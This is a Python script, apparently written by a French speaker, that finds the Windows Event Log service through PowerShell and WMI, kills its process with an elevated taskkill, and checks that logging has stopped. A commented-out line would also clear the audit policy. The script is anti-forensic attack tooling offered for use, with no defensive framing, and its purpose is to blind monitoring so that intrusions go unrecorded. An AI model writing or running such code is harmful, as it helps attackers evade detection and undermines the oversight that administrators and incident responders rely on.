import os
import time

def try_kill(pid):
    try:
        os.popen(f"powershell \"Start-Process powershell -Verb runas 'taskkill /PID {pid} /F '\"")
        return True
    except:
        return False

def disable_logs():
	#commande = 'auditpol /clear /y'
    #commande_disable_logs = "Get-WmiObject -Class win32_service -Filter \\"name = 'eventlog'\\" | select -exp ProcessId"
	disable_log = os.popen(""" powershell "Get-WmiObject -Class win32_service -Filter \\"name = 'eventlog'\\" | select -exp ProcessId" """)
	output = disable_log.read()
	output = int(output)
	print(output)
	if output == 0:
		pass
		return True
	else:
		if try_kill(output):
			time.sleep(5)
			get_id_log = os.popen(""" powershell "Get-WmiObject -Class win32_service -Filter \\"name = 'eventlog'\\" | select -exp ProcessId" """)
			output_id = get_id_log.read()
			print(output_id)
			output_id = int(output_id)
			if output_id == 0:
				print("C'est tout bon")
				return True
			else:
				print(u"Output ID != 0")
				return False
		else:
			print(u"Try Kill pas marché ")
			return False

